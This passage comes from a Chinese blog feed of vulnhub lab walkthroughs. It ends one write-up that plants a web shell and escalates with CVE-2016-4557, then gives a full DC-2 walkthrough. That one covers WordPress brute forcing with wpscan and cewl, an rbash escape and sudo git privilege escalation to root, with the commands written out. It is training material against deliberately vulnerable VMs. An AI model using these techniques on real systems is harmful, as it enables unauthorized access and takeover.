alt="image-20231023160537295"></p><p>2)我们可以看到有新建文件的地方</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160644458.png" alt="image-20231023160644458"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160723520.png" alt="image-20231023160723520"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160846628.png" alt="image-20231023160846628"></p><p>3)我们写入一句话木马</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160927555.png" alt="image-20231023160927555"></p><p>4)我们进行访问</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023161746016.png" alt="image-20231023161746016"></p><p>5)我们连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023162305646.png" alt="image-20231023162305646"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023161832251.png" alt="image-20231023161832251"></p><p>6)下载辅助脚本Linux-Exploit-Suggester.sh</p><p>下载地址<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023162449080.png" alt="image-20231023162449080"></p><p>ls -l linux-exploit-suggester.sh</p><p>7)发现没有执行权限，我们给他加个执行文件</p><p>chmod +x linux-exploit-suggester.sh</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151124133.png" alt="image-20231030151124133"></p><p>8)使用辅助脚本提权</p><p> 获取提权脚本</p><p>我们使用CVE-2016-4557</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151248430.png" alt="image-20231030151248430"></p><p>给出的链接无法下载，我们去kali里面寻找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151542971.png" alt="image-20231030151542971"></p><p>我们进行下载，并且上传到蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151614606.png" alt="image-20231030151614606"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030151707748.png" alt="image-20231030151707748"></p><p>我们进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030152008683.png" alt="image-20231030152008683"></p><p>获得root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030153555291.png" alt="image-20231030153555291"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231030153602386.png" alt="image-20231030153602386"></p><h1 id="三-相关知识点"><a href="#三-相关知识点" class="headerlink" title="三.相关知识点"></a>三.相关知识点</h1><p>1.joomscan</p><p>2.Nikto</p><p>3.实现交互式shell的几种方式</p><p>4.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell</p><p>5.提权辅助工具</p><p>6.Linux-Exploit-Suggester.sh</p><p>7.jhon</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一. 环境搭建&quot;&gt;&lt;/a&gt;一. 环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-2</title>
    <link href="http://ms02423.top/2023/10/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-2/"/>
    <id>http://ms02423.top/2023/10/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-2/</id>
    <published>2023-10-13T13:22:57.000Z</published>
    <updated>2023-10-13T15:02:13.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一．环境搭建"><a href="#一．环境搭建" class="headerlink" title="一．环境搭建"></a>一．环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>与DC-1非常相似，DC-2是另一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>与最初的DC-1一样，它的设计考虑到了初学者。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>就像DC-1一样，有五个标志，包括最后一个标志。</p><h2 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h2><p> <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214402559.png" alt="image-20231013214402559"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214451769.png" alt="image-20231013214451769"></p><h2 id="4-设置网卡为nat模式"><a href="#4-设置网卡为nat模式" class="headerlink" title="4.设置网卡为nat模式"></a>4.设置网卡为nat模式</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214559611.png" alt="image-20231013214559611"></p><p>虚拟机开启之后界面如下(和1一样)，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214714255.png" alt="image-20231013214714255"></p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>寻找真实的靶场ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013214909426.png" alt="image-20231013214909426"></p><p>Kali ip为192.168.52.152</p><p>所以分析可得靶机ip为192.168.52.131</p><h2 id="2-探端口以及服务"><a href="#2-探端口以及服务" class="headerlink" title="2.探端口以及服务"></a>2.探端口以及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215059360.png" alt="image-20231013215059360"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215130572.png" alt="image-20231013215130572"></p><p>发现开放了80端口，存在web服务，Apache&#x2F;2.4.10，</p><p>发现开放了7744端口，开放了ssh服务，OpenSSH 6.7p1</p><h2 id="3-进行访问端口"><a href="#3-进行访问端口" class="headerlink" title="3.进行访问端口"></a>3.进行访问端口</h2><p>我们访问:<a href="http://192.168.52.131/">http://192.168.52.131</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215316817.png" alt="image-20231013215316817"></p><p>本地访问不了会自动跳到DC-2。应该是给重定向了！我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。</p><p>修改hosts文件，添加靶机IP到域名dc-2的指向</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215523485.png" alt="image-20231013215523485"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215452669.png" alt="image-20231013215452669"></p><p>添加完成之后，再次访问，访问成功(我们使用kali里面的浏览器)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215834927.png" alt="image-20231013215834927"></p><p>根据wappalyzer插件可知当前运行的是一个wordpress的站点</p><h1 id="三-查找所有flag"><a href="#三-查找所有flag" class="headerlink" title="三.查找所有flag"></a>三.查找所有flag</h1><h2 id="1-站点下面存在一个flag"><a href="#1-站点下面存在一个flag" class="headerlink" title="1.站点下面存在一个flag"></a>1.站点下面存在一个flag</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013215918528.png" alt="image-20231013215918528"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220044963.png" alt="image-20231013220044963"></p><p>大致意思就是暴力破解，账号密码</p><h2 id="2-我们进行目录扫描"><a href="#2-我们进行目录扫描" class="headerlink" title="2.我们进行目录扫描"></a>2.我们进行目录扫描</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220314587.png" alt="image-20231013220314587"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220408917.png" alt="image-20231013220408917"></p><p>发现一个后台地址: <a href="http://dc-2/wp-login.php?redirect_to=http://dc-2/wp-admin/&reauth=1">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;reauth=1</a></p><h2 id="3-我们进行用户枚举"><a href="#3-我们进行用户枚举" class="headerlink" title="3.我们进行用户枚举"></a>3.我们进行用户枚举</h2><p>1)前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描</p><p>Wpscan一些常用语句：</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a></p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate t 扫描主题</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate p 扫描插件</p><p>wpscan –url <a href="http://dc-2/">http://dc-2</a> –enumerate u 枚举用户</p><p>2)我们先进行用户爆破用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220646280.png" alt="image-20231013220646280"></p><p>可以看到爆破出来三个用户名</p><p>2)我们进行爆破密码</p><p>我们使用cewl生成字典，使用wpscan进行暴力破解</p><p>cewl <a href="http://dc-2/">http://dc-2/</a> &gt; MS02423.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220835248.png" alt="image-20231013220835248"></p><p>3)最后我们爆破出来2个账号</p><p>jerry&#x2F;adipiscing           tom&#x2F;parturient</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013220912291.png" alt="image-20231013220912291"></p><p>4)我们进行登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221021765.png" alt="image-20231013221021765"></p><p>5)我们找到了flag2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221421875.png" alt="image-20231013221421875"></p><p>6)我们查看flag2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221437901.png" alt="image-20231013221437901"></p><p>意思是如果你不能利用WordPress并走捷径，还有另一种方法。</p><p>希望你找到了另一个切入点（这里我们想到7744端口，服务是ssh我们使用ssh进行登录）</p><h2 id="4-使用ssh进行登录"><a href="#4-使用ssh进行登录" class="headerlink" title="4.使用ssh进行登录"></a>4.使用ssh进行登录</h2><p>1)我们使用ssh登录账号，用jerry登录半天登录不上去，我们使用tom进行登录，发现可以登录成功，而且看到了flag3.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221825054.png" alt="image-20231013221825054"></p><p>2)我们查看flag3.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013221945751.png" alt="image-20231013221945751"></p><p>我们发现使用cat看不了，被rbash限制了</p><p>3)使用compgen -c 查看可以使用的命令，我们使用vi进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222101048.png" alt="image-20231013222101048"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222123923.png" alt="image-20231013222123923"></p><h2 id="5-rbash绕过"><a href="#5-rbash绕过" class="headerlink" title="5.rbash绕过"></a>5.rbash绕过</h2><p>1)echo $PATH       显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222446343.png" alt="image-20231013222446343"></p><p>2)cd进不去目录 ,前面我们知道可以使用ls，使用ls直接查看目录信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222612721.png" alt="image-20231013222612721"></p><p>3)使用echo来绕过rbash</p><p>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</p><p>export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</p><p>echo &#x2F;*</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013222753663.png" alt="image-20231013222753663"></p><p>4)我们可以看到cd可以使用了，我们cd .. ls 可以看到jerry</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223443700.png" alt="image-20231013223443700"></p><p>5)我们看到flag4.txt，查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223524657.png" alt="image-20231013223524657"></p><p>意思是</p><p>很高兴看到你走了这么远，但你还没回家。</p><p>您仍然需要获得最后的标志(唯一真正重要的标志！)</p><p>这里没有暗示，一，你现在只能靠自己了。*-)</p><p>继续</p><p>大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权</p><h2 id="6-我们进行提权"><a href="#6-我们进行提权" class="headerlink" title="6.我们进行提权"></a>6.我们进行提权</h2><p>1)我们可以看到无需root权限，jerry 可以使用 git</p><p>sudo -l </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013223939930.png" alt="image-20231013223939930"></p><p>2)查看一下可以使用的root权限命令</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224022322.png" alt="image-20231013224022322"></p><p>3)提权成功</p><p>1、sudo git help config #在末行命令模式输入 </p><p>!&#x2F;bin&#x2F;bash 或 !’sh’ #完成提权 </p><p>2、sudo git -p help </p><p>!&#x2F;bin&#x2F;bash #输入!&#x2F;bin&#x2F;bash，即可打开一个用户为root的shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224439557.png" alt="image-20231013224439557"></p><p>4)我们进入root用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224548835.png" alt="image-20231013224548835"></p><p>5)我们进行ls</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224558830.png" alt="image-20231013224558830"></p><p>6)我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231013224621819.png" alt="image-20231013224621819"></p><h1 id="四-相关知识点"><a href="#四-相关知识点" class="headerlink" title="四. 相关知识点"></a>四. 相关知识点</h1><p>1、git提权</p><p>2、rbash绕过</p><p>3、[ 常用工具篇 ] kali 自带目录扫描神器 dirb Headless (命令行)模式详解</p><p>4、WPScan使用完整攻略</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一．环境搭建&quot;&gt;&lt;a href=&quot;#一．环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一．环境搭建&quot;&gt;&lt;/a&gt;一．环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶机描述&quot;&gt;&lt;a href=&quot;#1-靶机描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
